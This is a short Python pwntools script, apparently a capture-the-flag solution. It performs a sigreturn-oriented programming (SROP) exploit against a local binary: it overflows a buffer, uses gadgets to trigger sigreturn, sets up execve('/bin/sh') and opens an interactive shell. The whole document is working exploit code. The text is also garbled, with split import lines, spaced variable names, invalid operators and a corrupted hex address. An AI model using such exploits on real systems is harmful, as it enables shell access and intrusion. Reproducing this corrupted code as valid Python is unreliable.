from pwn import
*
context.arch = "amd64"
padding = 'A'*0x48
pop rax = 0x0000000000401020 #pop rax, ret gadget
syscall = 0x000000000040101b #syscall gadget
bin sh = Oxeggedddds402000
#/bin/sh location
p = process('./srop')
payload = padding
payload += p64 (pop_rax)
payload +:= p64(15)
payload += p64(syscall)
frame = SigreturnFrame()
frame.rax = constants.SYS execve
frame.rdi = bin sh
frame.rip = syscall
payload += str(frame)
with open('payload', 'wb') as pp:
pp.write (payload)
p.sendline (payload)
p.interactive()

